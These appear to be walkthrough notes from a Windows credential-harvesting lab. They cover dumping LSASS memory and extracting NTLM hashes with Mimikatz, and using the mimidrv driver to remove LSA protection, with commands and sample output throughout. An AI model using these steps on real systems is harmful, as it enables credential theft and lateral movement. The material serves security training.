What is the LSASS?

Local Security Authority Server Service (LSASS) is a Windows process that handles the operating system security policy and enforces it on a system. It verifies logged in accounts and ensures passwords, hashes, and Kerberos tickets. 

Windows system stores credentials in the LSASS process to enable users to access network resources, such as:
    -file shares,
    -SharePoint sites, and other network services, without entering credentials every time a user connects.

Thus, the LSASS process is a juicy target for red teamers because it stores sensitive information about user accounts.
The LSASS is commonly abused to dump credentials to either escalate privileges, steal data, or move laterally. 

Luckily for us, if we have administrator privileges, we can dump the process memory of LSASS. Windows system allows us to create a dump file, a snapshot of a given process. 



Graphic User Interface (GUI)
    -To dump any running Windows process using the GUI, open the Task Manager, and from the Details tab, find the required process, right-click on it, and select -"Create dump file".
    -Once the dumping process is finished, a pop-up message will show containing the path of the dumped file. 
   - Now copy the file and transfer it to the AttackBox to extract NTLM hashes offline.

Copy the dumped process to the Mimikatz folder:

    Copying the LSASS Dumped file:
        C:\Users\Administrator>copy C:\Users\ADMINI~1\AppData\Local\Temp\2\lsass.DMP C:\Tools\Mimikatz\lsass.DMP
                1 file(s) copied.
        Sysinternals Suite



MimiKatz:
Mimikatz is a well-known tool used for extracting passwords, hashes, PINs, and Kerberos tickets from memory using various techniques. 
Mimikatz is a post-exploitation tool that enables other useful attacks, such as pass-the-hash, pass-the-ticket, or building Golden Kerberos tickets. 
Mimikatz deals with operating system memory to access information. Thus, it requires administrator and system privileges in order to dump memory and extract credentials.


Remember that the LSASS process is running as a SYSTEM. 
Thus in order to access users' hashes, we need a system or local administrator permissions. 
Thus, open the command prompt and run it as administrator. Then, execute the mimikatz binary as follows,

Runing mimikatz With Admin Privielges
    C:\Tools\Mimikatz> mimikatz.exe

Before dumping the memory for cashed credentials and hashes, we need to enable the SeDebugPrivilege and check the current permissions for memory access. 
It can be done by executing:
    privilege::debug command as follows:

    mimikatz # privilege::debug
        Privilege '20' OK

Once the privileges are given, we can access the memory to dump all cached passwords and hashes from the lsass.exe process using "sekurlsa::logonpasswords". 
If we try this on the provided VM, it will not work until we fix it in the next section.

    Dumping the Stored Clear-text Passwords:
        mimikatz # sekurlsa::logonpasswords

                Authentication Id : 0 ; 515377 (00000000:0007dd31)
                Session           : RemoteInteractive from 3
                User Name         : Administrator
                Domain            : THM
                Logon Server      : CREDS-HARVESTIN
                Logon Time        : 6/3/2022 8:30:44 AM
                SID               : S-1-5-21-1966530601-3185510712-10604624-500
                        msv :
                        [00000003] Primary
                        * Username : Administrator
                        * Domain   : THM
                        * NTLM     : 98d3a787a80d08385cea7fb4aa2a4261
                        * SHA1     : 64a137cb8178b7700e6cffa387f4240043192e72
                        * DPAPI    : bc355c6ce366fdd4fd91b54260f9cf70
...
Mimikatz lists a lot of information about accounts and machines. 
If we check closely in the Primary section for Administrator users, we can see that we have an NTLM hash. 

Note to get users' hashes, a user (victim) must have logged in to a system, and the user's credentials have been cached.



Protected LSASS:
In 2012, Microsoft implemented an LSA protection, to keep LSASS from being accessed to extract credentials from memory. This task will show how to disable the LSA protection and dump credentials from memory using Mimikatz. 
To enable LSASS protection, we can modify the registry "RunAsPPL DWORD value in HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" to 1.

The steps are similar to the previous section, which runs the Mimikatz execution file with admin privileges and enables the debug mode. 

If the LSA protection is enabled, we will get an error executing the "sekurlsa::logonpasswords" command.


Failing to Dump Stored Password Due to the LSA Protection
        mimikatz # sekurlsa::logonpasswords
            ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
The command returns a 0x00000005 error code message (Access Denied). 
Lucky for us, Mimikatz provides a mimidrv.sys driver that works on kernel level to disable the LSA protection. We can import it to Mimikatz by executing "!+" as follows,

Loading the mimidrv Driver into Memory
    mimikatz # !+
        [*] 'mimidrv' service not present
        [+] 'mimidrv' service successfully registered
        [+] 'mimidrv' service ACL to everyone
        [+] 'mimidrv' service started
Note: If this fails with an isFileExist error, exit mimikatz, navigate to C:\Tools\Mimikatz\ and run the command again.

Once the driver is loaded, we can disable the LSA protection by executing the following Mimikatz command:

Removing the LSA Protection:
    mimikatz # !processprotect /process:lsass.exe /remove
        Process : lsass.exe
        PID 528 -> 00/00 [0-0-0]
Now, if we try to run the "sekurlsa::logonpasswords" command again, it must be executed successfully and show cached credentials in memory.